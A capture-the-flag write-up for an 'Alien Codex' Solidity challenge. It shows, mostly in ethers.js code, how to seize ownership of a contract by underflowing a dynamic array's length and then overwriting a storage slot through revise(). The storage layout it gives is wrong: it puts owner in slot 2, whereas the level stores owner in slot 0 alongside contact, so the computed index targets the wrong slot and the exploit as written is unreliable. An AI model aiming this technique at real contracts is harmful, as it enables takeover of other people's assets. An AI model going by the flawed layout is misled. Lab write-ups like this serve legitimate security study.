# Level 19: Alien Codex

## Challenge Overview

This challenge highlights storage layout manipulation in Solidity and the risks of saving data where it doesn’t belong.  
The goal is to gain ownership of the `AlienCodex` contract by exploiting its vulnerabilities.



## Solution

### 1. Understand the Vulnerabilities

- `AlienCodex` has a `bytes32[] public codex` array whose length is stored in **slot 1**.
- It also has an `owner` variable in **slot 2**.
- Calling `retract()` when `codex.length == 0` causes an underflow, setting `codex.length = 2^256 - 1`.
- Once the array length is huge, `revise(i, …)` lets you write to storage slot `keccak256(1) + i`.  
  By choosing `i` correctly, you can target slot 2 and overwrite `owner`.



## 2. Adjust Your Mental Model: Storage Layout

- **Slot 0**: `contact` (bool)  
- **Slot 1**: `codex.length` (uint256)

```js
base = keccak256(abi.encode(uint256(1))) // slot 1 hashed
```

And element `codex[i]` lives at `base + i (mod 2^256)`.



## 3. How to Exploit

### 1. Call `make_contact()`

```js
await alienCodex.make_contact();
```

> This sets `contact = true`, allowing `retract` and `revise` to run.



### 2. Trigger the underflow with `retract()`

```js
await alienCodex.retract();
// Now codex.length == 2^256 - 1
```



### 3. Compute the index that maps to slot 2

```js
// 3.1) Compute base = keccak256(slot 1)
const base = ethers.BigNumber.from(
  ethers.utils.keccak256(
    ethers.utils.defaultAbiCoder.encode(["uint256"], [1])
  )
);

// 3.2) Solve for i: base + i ≡ 2 (mod 2^256)
const idx = ethers.BigNumber.from(2)
  .sub(base)
  .mod(ethers.BigNumber.from(2).pow(256));

// 3.3) Prepare your address in 32-byte form
const newOwner = ethers.utils.hexZeroPad(playerAddress, 32);
```



### 4. Overwrite `owner` via `revise(idx, newOwner)`

```js
await alienCodex.revise(idx, newOwner);
```



### 5. Verify Ownership

```js
console.log(await alienCodex.owner()); // should be your address
```



## Lessons Learned

- Decrementing a zero-length array underflows to 2^256−1, letting you index data **outside** the space you were supposed to.
- Dynamic arrays store elements at `keccak256(slot) + index`.  
  By underflowing, you can compute an index that hits any slot (in this case, slot 2 for `owner`).
- Always guard against underflow/overflow when changing array lengths.
- Know exactly where each variable lives so you don’t accidentally overwrite something critical.
